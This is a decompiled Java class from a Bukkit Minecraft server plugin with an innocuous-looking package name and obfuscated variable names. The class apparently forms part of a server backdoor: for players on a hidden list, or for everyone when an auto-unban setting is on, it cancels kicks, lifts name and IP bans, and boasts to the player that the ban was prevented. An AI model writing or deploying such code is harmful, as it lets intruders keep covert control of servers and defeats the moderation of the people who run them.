/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.BanList$Type
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.event.EventHandler
 *  org.bukkit.event.Listener
 *  org.bukkit.event.player.PlayerKickEvent
 */
package me.system.runner.events;

import me.system.runner.Core;
import me.system.runner.data.DataManager;
import me.system.runner.methods.API;
import me.system.runner.utils.Settings;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;

public class AntiBanListener
implements Listener {
    private static final /* synthetic */ Core INSTANCE;

    static {
        INSTANCE = (Core)Core.getPlugin(Core.class);
    }

    @EventHandler
    public void onKick(PlayerKickEvent lllllllllllllIlIlIIIIlIllIllllII) {
        Player lllllllllllllIlIlIIIIlIllIlllIll = lllllllllllllIlIlIIIIlIllIllllII.getPlayer();
        if (AntiBanListener.INSTANCE.lite.contains(lllllllllllllIlIlIIIIlIllIlllIll.getName())) {
            lllllllllllllIlIlIIIIlIllIllllII.setCancelled(true);
            if (lllllllllllllIlIlIIIIlIllIllllII.getPlayer().isBanned()) {
                Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(lllllllllllllIlIlIIIIlIllIllllII.getPlayer().getName());
                Bukkit.getServer().getBanList(BanList.Type.IP).pardon(API.getIPOfPlayer(lllllllllllllIlIlIIIIlIllIlllIll));
            }
            lllllllllllllIlIlIIIIlIllIlllIll.sendMessage(Settings.INFO(String.valueOf(new StringBuilder().append("Someone tried to kick/ban you but ").append(Settings.NAME).append(" prevented it"))));
        } else if (DataManager.getData().getBoolean("autounban")) {
            lllllllllllllIlIlIIIIlIllIllllII.setCancelled(true);
            if (lllllllllllllIlIlIIIIlIllIllllII.getPlayer().isBanned()) {
                Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(lllllllllllllIlIlIIIIlIllIllllII.getPlayer().getName());
                Bukkit.getServer().getBanList(BanList.Type.IP).pardon(API.getIPOfPlayer(lllllllllllllIlIlIIIIlIllIlllIll));
            }
            lllllllllllllIlIlIIIIlIllIlllIll.sendMessage(Settings.INFO("Someone tried to kick/ban you but there was an error!"));
        }
    }

    public AntiBanListener() {
        AntiBanListener lllllllllllllIlIlIIIIlIlllIIIIII;
    }
}

